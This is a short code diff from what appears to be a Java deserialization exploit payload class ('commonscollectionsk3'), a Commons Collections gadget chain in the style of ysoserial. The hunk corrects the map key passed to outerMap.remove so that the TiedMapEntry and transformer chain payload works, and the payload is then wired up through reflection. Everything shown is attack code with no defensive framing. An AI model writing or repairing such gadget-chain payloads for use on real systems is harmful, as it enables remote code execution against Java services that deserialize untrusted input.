@@ -28,7 +28,7 @@ public class commonscollectionsk3 implements ObjectPayload<Object> {
         TiedMapEntry  tme              = new TiedMapEntry(outerMap, "QI4L");
         Map           expMap           = new HashMap();
         expMap.put(tme, "QI5L");
-        outerMap.remove("QI6L");
+        outerMap.remove("QI4L");
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
         return expMap;
